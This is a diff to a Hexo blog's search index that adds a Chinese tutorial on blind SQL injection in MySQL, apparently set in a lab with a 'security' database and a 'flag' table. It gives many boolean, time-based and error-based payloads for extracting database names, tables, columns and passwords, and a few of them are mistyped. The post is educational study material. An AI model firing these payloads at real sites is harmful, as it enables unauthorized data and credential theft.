@@ -3,6 +3,132 @@
   
     
     <entry>
+      <title><![CDATA[SQL注入之盲注]]></title>
+      <url>/2019/08/19/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/</url>
+      <content type="html"><![CDATA[<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><code>sql注入的一种，之所以被称为盲注，因为它不会根据你插入的恶意的sql注入语句来 返回你所需要的信息。</code></p>
+<h1 id="盲注分类"><a href="#盲注分类" class="headerlink" title="盲注分类"></a>盲注分类</h1><ol>
+<li><p>布尔盲注</p>
+</li>
+<li><p>时间盲注</p>
+</li>
+<li><p>报错盲注</p>
+</li>
+</ol>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="布尔注入原理"><a href="#布尔注入原理" class="headerlink" title="布尔注入原理"></a>布尔注入原理</h2><p>布尔盲注时，也就相当于”逻辑”注入。我们在注入的过程，页面呈现给我们的就是一个布尔值：true/flase.我们可以跟住这个布尔值来进行有效判断。 如果是ture则返回网站正常页面，如果是是fales则返回一个错误页面，且页面上不会出现任何错误信息。</p>
+<h2 id="布尔注入常用函数"><a href="#布尔注入常用函数" class="headerlink" title="布尔注入常用函数"></a>布尔注入常用函数</h2><h3 id="Left函数（s，n）"><a href="#Left函数（s，n）" class="headerlink" title="Left函数（s，n）"></a>Left函数（s，n）</h3><p>返回字符串s左边第n个值</p>
+<h3 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h3><p>返回字符串的长度</p>
+<h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h3><p>substr(string,start,length);</p>
+<p>string为字符串；</p>
+<p>start为字符串起始截取位置；</p>
+<p>length为字符串长度;</p>
+<h3 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h3><p>将字符串中最左边字符转换为相对应的ASCII代码值。</p>
+<h3 id="regxp-函数"><a href="#regxp-函数" class="headerlink" title="regxp()函数"></a>regxp()函数</h3><p>正则表达式配对</p>
+<h2 id="布尔使用方法"><a href="#布尔使用方法" class="headerlink" title="布尔使用方法"></a>布尔使用方法</h2><p>对于布尔注入使用方法，我们常常使用的是为二分法。假设数据是按升序排序的，对于给定值 x，从序列的中间位置开始比较，如果当前位置值等于 x，则查找成功；若 x 小于当前位置值，则在数列的前半段中选择中间的再次查找；若 x 大于当前位置值则在数列的后半段中选择中间的数继续查找， 直到找到为止。</p>
+<h3 id="猜数据库长度"><a href="#猜数据库长度" class="headerlink" title="猜数据库长度"></a>猜数据库长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length(database()))&lt;10--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),1,1)))&gt;100--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜测表名"><a href="#猜测表名" class="headerlink" title="猜测表名"></a>猜测表名</h3><p>长度：</p>
+<figure class="highlight plain"><figcaption><span>table_name from</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables where table_schema=database() limit 0,1)))&lt;10--+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;116--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h3><p>长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1)))&gt;10 --+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h3><p>密码长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length(( select password from users limit 0,1)))=6--+</span><br></pre></td></tr></table></figure>
+
+<p>密码内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure>
+
+<p>账号同理将password换成user。</p>
+<h1 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h1><h2 id="时间注入原理"><a href="#时间注入原理" class="headerlink" title="时间注入原理"></a>时间注入原理</h2><p>通过sleep函数进行sql注入，查看页面返回信息速度是否明显延迟了对应的时间秒数。通过页面的延迟时间来判<br>断是否注入成功。但需要注意的是，时间注入返回的页面信息一样是没有回显错误的页面，我们只是根据页面延迟时间来进行猜测判断。</p>
+<h2 id="时间注入函数"><a href="#时间注入函数" class="headerlink" title="时间注入函数"></a>时间注入函数</h2><h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h3><p>sleep(n)函数可以让数据库执行语句”停留”n秒时间，成功执行会返回0。而如果执行过程中断，会返回1。<br>sleep()函数可以让函数停留n秒时间，然后 返回０。如果程序被打断,则返回1。</p>
+<h3 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h3><p>if(表达式1,表达式2,表达式3)</p>
+<p>当表达式１是true，则会返回表达式２；否则返回表达式３。</p>
+<h2 id="时间盲注使用方法"><a href="#时间盲注使用方法" class="headerlink" title="时间盲注使用方法"></a>时间盲注使用方法</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1=0,1, sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h3><p>长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(database())=8,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><p>长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select tablen_ame from information_schema.tables where table_schema=&apos;security&apos; limit 1,1))=5,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And If(ascii(substr((select tablen_ame from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1))=117,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜列名-1"><a href="#猜列名-1" class="headerlink" title="猜列名"></a>猜列名</h3><p>长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;flag&apos; limit 1,1))=４,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select columnname from informationschema.columns where tableschema=&apos;security&apos; and tablename=&apos;flag&apos; limit 1,1),1,1))=117,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select flag from security.flag limit 0,1))=4,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>一般都是基于数据库某些函数特性 函数特性和数据库本身的特性 数据库本身的特性来返回错误信息，从而获取到我们想要的数据库信息，从而实现我们sql注入的目的。</p>
+<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><h3 id="floor函数-取整"><a href="#floor函数-取整" class="headerlink" title="floor函数(取整)"></a>floor函数(取整)</h3><p>sql注入的floor语句公式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-函数"><a href="#exp-函数" class="headerlink" title="exp()函数"></a>exp()函数</h3><p>用于计算e的x次方的函数。</p>
+<blockquote>
+<p>exp函数特性：在mysql数据库中，exp()只能计算710之内的数值，一旦超过或者等于710的话，则会进行整形报错溢出。提示：DOUBLE value is out of<br>range in ‘exp(710)’ double类型超出了exp(710)范围。</p>
+</blockquote>
+<blockquote>
+<p>如果构造利用为~0的话，它是代表着按0按位取反就会返回“18446744073709551615”，得到最大的无符号BIGINT值。</p>
+</blockquote>
+<p><code>利用环境：mysql&gt;5.5.5
+利用上述exp和~特性，我们可以构造成payload:and (EXP(~(select * from(select version())a)));</code></p>
+<h3 id="数据重复报错"><a href="#数据重复报错" class="headerlink" title="数据重复报错"></a>数据重复报错</h3><p>利用环境：mysql低版本</p>
+<pre><code>payload：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code></pre><p>利用了数据库无法识别重复查询数据库版本信息的操作，从而进行报错。</p>
+<h3 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h3><p>数据库环境:mysql 5.1.5</p>
+<h4 id="updataxml-函数"><a href="#updataxml-函数" class="headerlink" title="updataxml()函数"></a>updataxml()函数</h4><p>UPDATEXML (XMLdocument, XPathstring, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>作用：改变文档中符合条件的节点的值（其实简单的说，就是对xml进行查询和修改）</p>
+<h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><p>extractvalue(目标xml文档，xml路径)</p>
+<p><code>作用:对xml进行查修和修改。</code></p>
+<pre><code>payload: and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+payload: and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
+payload：and (extractvalue(1,concat(0×7e,(version()),0×7e)));</code></pre><p>在这里我们先是查询了数据库的版本信息，而后concat函数进行连接字符串信息，然后利用xml语法进行查询和修改。但是我们却使用 0x7e进行拼接，0x7e是啥？这是特殊字符~进行十六进制转换的结果。同时updataxml函数是第二位置是拼接xml字符串，而extractvalue是需要xml路 径。至于xml具体语法我就不讲解了，这里0x7e嵌套在里面的话，xml语法是无法识别的，所以会进行报错，从而产生了报错得到我们想要的信息。</p>
+<h1 id="其他盲注报错注入函数利用："><a href="#其他盲注报错注入函数利用：" class="headerlink" title="其他盲注报错注入函数利用："></a>其他盲注报错注入函数利用：</h1><p>GeometryCollection()</p>
+<p>id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</p>
+<p>polygon()</p>
+<p>id =1 AND polygon((select * from(select * from(select user())a)b))</p>
+<p>multipoint()</p>
+<p>id = 1 AND multipoint((select * from(select * from(select user())a)b))</p>
+<p>multilinestring()</p>
+<p>id = 1 AND multilinestring((select * from(select * from(select user())a)b))</p>
+<p>linestring()</p>
+<p>id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</p>
+<p>multipolygon()</p>
+<p>id =1 AND multipolygon((select * from(select * from(select user())a)b))</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[SQL注入之cookie和user-agent注入]]></title>
       <url>/2019/08/17/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bcookie%E5%92%8Cuser-agent%E6%B3%A8%E5%85%A5/</url>
       <content type="html"><![CDATA[<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="cookie简介"><a href="#cookie简介" class="headerlink" title="cookie简介"></a>cookie简介</h2><p>cookie是一串加密过的数据，是网站为了辨别用户身份而存在在用户本地终端。简单理解。它就是一个用户身份凭证，并保存在本地客户端。</p>
@@ -1124,9 +1250,9 @@ hexo d</code></pre><h1 id="浏览"><a href="#浏览" class="headerlink" title="�
         
         <tags>
             
-            <tag> 博客 </tag>
-            
             <tag> Hexo </tag>
+            
+            <tag> 博客 </tag>
             
         </tags>
         
